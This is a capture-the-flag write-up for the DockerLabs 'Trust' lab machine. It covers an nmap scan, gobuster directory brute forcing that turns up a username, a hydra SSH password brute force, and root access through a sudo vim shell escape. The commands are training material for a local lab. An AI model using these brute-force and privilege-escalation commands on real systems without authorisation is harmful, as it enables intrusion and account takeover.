# Trust

{% embed url="https://dockerlabs.es/#/" %}

[🔗 DockerLabs.es](https://dockerlabs.es/#/)

&#x20;[🔗](https://dockerlabs.es/#/) [How to setup a Docker Image ](https://dockerlabs.es/assets/instrucciones\_de\_uso.pdf)

<details>

<summary>CTF BootToRoot</summary>

A **CTF** (Capture The Flag) **Boot To Root** (B2R) is a type of cybersecurity challenge where participants are tasked with gaining unauthorized access to a computer system (the "Boot" part) and then obtaining and eventually capturing a specific flag or set of flags (the "Root" part). The flags could be strings of text, files, or other data that prove the participant has successfully compromised the system.

In these challenges, participants typically start with minimal information about the target system and have to use various techniques, including vulnerability analysis, exploitation, privilege escalation, and more, to gain access and ultimately root access to the system. The challenges often simulate real-world scenarios and are designed to test participants' skills in penetration testing, exploit development, reverse engineering, and other cybersecurity domains. They can be hosted online or in-person as part of cybersecurity competitions, training events, or educational exercises.

</details>

## Task 1 - Deploy the machine

Install docker.io (if you do not already have it installed) -> `sudo apt install docker.io`

Download machine from DockerLabs website and setup lab:

* `unzip trust.zip`
* `sudo bash auto_deploy.sh trust.tar`

<div align="left">

<figure><img src="../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

</div>

and we obtained IP machine -> 🎯 Target IP: `172.17.0.2`

We can put the IP in the file to associate it with an easier to remember name:

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "172.17.0.2 trust" >> /etc/hosts
</strong></code></pre>

Create a directory for machine on a dedicated folder and subdir containing: nmap,content,exploits,scripts

<pre class="language-bash"><code class="lang-bash"><strong>mkdir -p DockerLabs/trust
</strong>cd DockerLabs/trust
<strong>mkdir {nmap,content,exploits,scripts}
</strong><strong>
</strong># At the end of the Lab
CTRL + C #To stop running machine

<strong>sed -i '$ d' /etc/hosts # To clean up the last line from the /etc/hosts file
</strong><strong>
</strong># To repair potential problem during activities
sudo systemctl restart docker
sudo docker stop $(docker ps -q)
sudo docker container prune -force
</code></pre>

## Task 2 - Reconnaissance and Exploitation

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 trust
PING trust (172.17.0.2) 56(84) bytes of data.
64 bytes from trust (172.17.0.2): icmp_seq=1 ttl=64 time=0.052 ms
64 bytes from trust (172.17.0.2): icmp_seq=2 ttl=64 time=0.077 ms
64 bytes from trust (172.17.0.2): icmp_seq=3 ttl=64 time=0.048 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system, while Windows systems usually have a TTL of 128 secs.

### 2.1 Ports in listening and relative services

Of course, we start looking for information about our target by scanning the open ports with the nmap tool

```bash
nmap -Pn -n -p0- trust
```

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

There're two open port (22, 80), analyze them searching more info about services version and potential vulns:

```bash
nmap -A -sVC -p 22,80 trust -oN nmap/port_scan
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 4.15 - 5.8 (96%), Linux 2.6.32 - 3.10 (96%), Linux 5.0 - 5.5 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>Pn</td><td>no ping</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

As always we begin our exploration from port 80, where we know there is a web server, so we execute the whatweb command to extract more information and then view the content using the browser

```bash
whatweb http://trust
```

<figure><img src="../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

Let's display the default Apache page, try analysing the source page with CTRL+U

<figure><img src="../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

But we don't discover nothing of interisting.

### 2.2 Brute force hidden web directory

Now, we try to find potential hidden directory using gobuster:

```bash
gobuster dir -u http://trust -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

<figure><img src="../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

We only find a useless 403 status code, so we try inserting web extensions (html, xml and php) with the -x flag:

```
gobuster dir -u http://trust -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,xml,php
```

<figure><img src="../.gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>

and finally we obtain two status code 200, the index.html is the homepage (that we just know), therefore we go to the secret.php

<figure><img src="../.gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>

We find as info a potential username, remembering that port 22 (SSH) is open, not knowing the password we could try a brute force attack with hydra

### 2.3 Brute force ssh credentials

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt trust ssh
```

<figure><img src="../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

Fantastic, we discovered the password, we use it to log in via SSH with the following command: `ssh mario@trust`

<figure><img src="../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

## Task 3 - Privilege Escalation

Now that we are inside, since we are not root user we need to elevate our privileges, so let's check the current permissions using `sudo -l`

<figure><img src="../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

We see that mario user has root permissions for /usr/bin/vim, then we can use [gtfobins](https://gtfobins.github.io/gtfobins/vim/) to find it.

{% embed url="https://gtfobins.github.io/gtfobins/vim/" %}

<figure><img src="../.gitbook/assets/image (262).png" alt=""><figcaption><p><a href="https://gtfobins.github.io/gtfobins/vim/">https://gtfobins.github.io/gtfobins/vim/</a></p></figcaption></figure>

using vim sudo command, we obtain a root permission `sudo vim -c ':!/bin/sh'`

<div align="left">

<figure><img src="../.gitbook/assets/image (263).png" alt=""><figcaption></figcaption></figure>

</div>
